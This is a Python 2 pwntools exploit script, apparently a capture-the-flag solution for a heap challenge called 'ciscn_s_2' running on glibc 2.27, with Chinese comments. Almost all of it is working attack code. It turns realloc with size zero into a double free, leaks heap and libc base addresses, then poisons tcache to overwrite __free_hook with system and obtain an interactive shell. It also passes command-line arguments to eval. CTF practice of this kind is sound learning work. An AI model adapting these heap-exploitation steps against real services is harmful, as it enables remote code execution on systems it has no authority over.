#!/usr/bin/env python2
# -*- coding: utf-8 -*- #
# @偏有宸机_Exploit-Template
# Exploiting: python exploit.py [IP PORT] [Exploit_Template]
# Edit values:
#      - RemPro()
#           - elf_addr
#           - pro_libc
#           - enable_Onegadgets
#      - exp()

from json.tool import main
import os
import sys
import subprocess
from pwn import *
from one_gadget import generate_one_gadget 
# context.terminal = ["tmux","new-window"]
# context.terminal = ["tmux","splitw","-h"]
context.arch = "amd64"
# context.arch = "i386"
# context.log_level = "debug"

### 远程本地连接
def RemPro(ip='',port=''):
    global sh,elf,libc,one_ggs
    elf_addr = "./ciscn_s_2"                                   # 本地ELF
    pro_libc = "libc-2.27_64.so"       # Libc文件
    rem_libc = "libc-2.27_64.so"
    if len(sys.argv) > 2 :
        sh = remote(sys.argv[1],sys.argv[2])
        try:
            libc = ELF(rem_libc)
            pro_libc = rem_libc
        except:
            log.info("No set Remote_libc...")
            libc = ELF(pro_libc)
    else:
        libc = ELF(pro_libc)
        try:
            sh = remote(ip,port)
            libc = ELF(rem_libc)
            pro_libc = rem_libc
            log.info("Remote Start...")
        except:
            sh = process(elf_addr)
            log.info("Local Start...")
    # one_ggs = [0x45226, 0x4527a, 0xf0364,0xf1207]
    # one_ggs = one_gadget(pro_libc)
    elf = ELF(elf_addr)
    return 1

### 调试用
def debug(cmd=""):
    if len(sys.argv) <= 2:
        log.progress("Loading Debug....")
        gdb.attach(sh,cmd)
### One_Gadget
# def one_gadget(filename):
#     log.progress("Leak One_Gadgets...")
#     one_ggs = str(subprocess.check_output(['one_gadget', '--raw', '-f',filename]))[2:-3].split(' ')
#     return list(map(int,one_ggs))
def one_gadget(libc_addr):
    log.progress("Leak One_Gadgets...")
    path_to_libc=libc_addr
    gadget =[]
    for offset in generate_one_gadget(path_to_libc):
        gadget.append(int(offset))
    return gadget
    # one_gg = one_gadget("/lib/x86_64-linux-gnu/libc.so.6")

ru=lambda s:sh.recvuntil(s) 
rv=lambda s:sh.recv(s)
sd=lambda s:sh.send(s)
sl=lambda s:sh.sendline(s)

def create(size,content):
    ru(":")
    sl('1')
    ru(">")
    sl(str(size))
    ru(":")
    sl(content)

def edit(idx,content):
    ru(":")
    sl('2')
    ru(":")
    sl(str(idx))
    ru(":")
    sd(content)

def show(idx):
    ru(":")
    sl('3')
    ru(":")
    sl(str(idx))

def delete(idx):
    ru(":")
    sl('4')
    ru(":")
    sl(str(idx))

def exp():
    create(0,'') # 这里有个小trick realloc(ptr,size)如果size是0的话 效果等同于free()
    edit(0,'')
    delete(0) # 这样就做成了double_free
    create(0x10,p64(0))
    create(0x10,'protect')
    show(0)
    ru("Content: ")
    heap_base=u64(rv(6).ljust(8,'\x00'))-0xa0-0x200
    info("heap_base: "+hex(heap_base))
    create(0x500,'aaa') # 这里还有一个小trick 当size足够大的时候 free会直接进unsorted bin 而不是tcache
    create(0x10,'/bin/sh\x00')
    delete(2)
    edit(0,p64(heap_base+0x2d0+0x10)+'\x80')


    show(1)
    ru("Content: ")
    main_arena=u64(rv(6).ljust(8,'\x00'))-96
    info("main_arena: "+hex(main_arena))
    libc_base=main_arena-0x3ebc40
    success("libc_base: "+hex(libc_base))
    ogg=libc_base+0x10a38c
    info("ogg: "+hex(ogg))
    free_hook=libc_base+libc.symbols['__free_hook']
    info("free_hook: "+hex(free_hook))
    malloc_hook=libc_base+libc.symbols['__malloc_hook']
    info("malloc_hook: "+hex(malloc_hook))
    system_addr=libc_base+libc.symbols['system']
    info("system_addr: "+hex(system_addr))


    create(0x500,'')
    create(0,'')
    edit(4,'')
    delete(4)
    create(0x10,p64(0))
    # create(0x10,'')
    edit(4,p64(free_hook)+'\x08')
    create(0x10,p64(system_addr))
    # edit(5,'a'*0x13+p64(ogg))
    # delete(5)
    # delete(4)
    # debug()
    
if __name__=="__main__":
    RemPro()
    if len(sys.argv) > 3 :
        eval(sys.argv[3])()
    elif (len(sys.argv)>1 and len(sys.argv)<3):
        eval(sys.argv[1])()
    else:
        exp()
    sh.interactive()
    

